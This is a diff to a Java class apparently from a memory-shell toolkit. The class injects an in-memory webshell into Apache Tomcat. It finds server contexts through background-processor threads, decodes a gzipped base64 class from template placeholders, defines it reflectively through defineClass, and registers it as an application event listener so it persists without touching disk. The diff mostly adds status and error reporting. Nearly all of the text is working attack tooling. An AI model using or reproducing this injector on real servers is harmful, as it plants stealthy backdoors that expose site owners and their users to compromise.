@@ -3,32 +3,18 @@ package com.reajason.javaweb.memshell.injector.tomcat;
 import java.io.ByteArrayInputStream;
 import java.io.ByteArrayOutputStream;
 import java.io.IOException;
+import java.io.PrintStream;
 import java.lang.reflect.Field;
 import java.lang.reflect.Method;
 import java.util.*;
 import java.util.zip.GZIPInputStream;
 
 /**
- * Tomcat Listener 注入器
- * 测试版本：
- * jdk    v1.8.0_275
- * tomcat v5.5.36, v6.0.9, v7.0.32, v8.5.83, v9.0.67
- *
  * @author pen4uin, ReaJason
  */
 public class TomcatListenerInjector {
 
-    public TomcatListenerInjector() {
-        try {
-            List<Object> contexts = getContext();
-            for (Object context : contexts) {
-                Object listener = getShell(context);
-                inject(context, listener);
-            }
-        } catch (Exception e) {
-            e.printStackTrace();
-        }
-    }
+    private String msg = "";
 
     public String getClassName() {
         return "{{className}}";
@@ -38,8 +24,47 @@ public class TomcatListenerInjector {
         return "{{base64Str}}";
     }
 
-    public List<Object> getContext() throws Exception {
-        List<Object> contexts = new ArrayList<Object>();
+    public TomcatListenerInjector() {
+        Set<Object> contexts = null;
+        try {
+            contexts = getContext();
+        } catch (Throwable throwable) {
+            msg += "context error: " + getErrorMessage(throwable);
+        }
+        if (contexts != null) {
+            for (Object context : contexts) {
+                msg += ("context: [" + getContextRoot(context) + "] ");
+                try {
+                    Object shell = getShell(context);
+                    inject(context, shell);
+                    msg += " [/*] ready\n";
+                } catch (Throwable e) {
+                    msg += "failed " + getErrorMessage(e) + "\n";
+                }
+            }
+        }
+        System.out.println(msg);
+    }
+
+    @SuppressWarnings("all")
+    private String getContextRoot(Object context) {
+        String r = null;
+        try {
+            r = (String) invokeMethod(invokeMethod(context, "getServletContext", null, null), "getContextPath", null, null);
+        } catch (Exception ignored) {
+        }
+        String c = context.getClass().getName();
+        if (r == null) {
+            return c;
+        }
+        if (r.isEmpty()) {
+            return c + "(/)";
+        }
+        return c + "(" + r + ")";
+    }
+
+    public Set<Object> getContext() throws Exception {
+        Set<Object> contexts = new HashSet<>();
         Set<Thread> threads = Thread.getAllStackTraces().keySet();
         for (Thread thread : threads) {
             if (thread.getName().contains("ContainerBackgroundProcessor")) {
@@ -66,18 +91,19 @@ public class TomcatListenerInjector {
         }
     }
 
-    @SuppressWarnings("all")
     private Object getShell(Object context) throws Exception {
-        ClassLoader webAppClassLoader = getWebAppClassLoader(context);
+        ClassLoader classLoader = getWebAppClassLoader(context);
+        Class<?> clazz = null;
         try {
-            return webAppClassLoader.loadClass(getClassName()).newInstance();
+            clazz = classLoader.loadClass(getClassName());
         } catch (Exception e) {
             byte[] clazzByte = gzipDecompress(decodeBase64(getBase64String()));
             Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
             defineClass.setAccessible(true);
-            Class<?> clazz = (Class<?>) defineClass.invoke(webAppClassLoader, clazzByte, 0, clazzByte.length);
-            return clazz.newInstance();
+            clazz = (Class<?>) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
         }
+        msg += "[" + classLoader.getClass().getName() + "] ";
+        return clazz.newInstance();
     }
 
     @SuppressWarnings("all")
@@ -87,26 +113,26 @@ public class TomcatListenerInjector {
             List<Object> listeners = (List<Object>) objects;
             for (Object o : listeners) {
                 if (o.getClass().getName().equals(getClassName())) {
-                    System.out.println("listener already injected");
                     return;
                 }
             }
             listeners.add(listener);
-            System.out.println("listener inject successful");
         } else {
             List arrayList = new ArrayList(Arrays.asList(((Object[]) objects)));
             for (Object o : arrayList) {
                 if (o.getClass().getName().equals(getClassName())) {
-                    System.out.println("listener already injected");
                     return;
                 }
             }
             arrayList.add(listener);
             invokeMethod(context, "setApplicationEventListeners", new Class[]{Object[].class}, new Object[]{arrayList.toArray()});
-            System.out.println("listener inject successful");
         }
     }
 
+    @Override
+    public String toString() {
+        return msg;
+    }
 
     @SuppressWarnings("all")
     public static byte[] decodeBase64(String base64Str) throws Exception {
@@ -152,7 +178,7 @@ public class TomcatListenerInjector {
 
             }
         }
-        throw new NoSuchFieldException(name);
+        throw new NoSuchFieldException(obj.getClass().getName() + " Field not found: " + name);
     }
 
 
@@ -198,6 +224,21 @@ public class TomcatListenerInjector {
             return method.invoke(obj instanceof Class ? null : obj, param);
         } catch (Exception e) {
             throw new RuntimeException("Error invoking method: " + methodName, e);
+        }
+    }
+
+    @SuppressWarnings("all")
+    private String getErrorMessage(Throwable throwable) {
+        PrintStream printStream = null;
+        try {
+            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
+            printStream = new PrintStream(outputStream);
+            throwable.printStackTrace(printStream);
+            return outputStream.toString();
+        } finally {
+            if (printStream != null) {
+                printStream.close();
+            }
         }
     }
 }
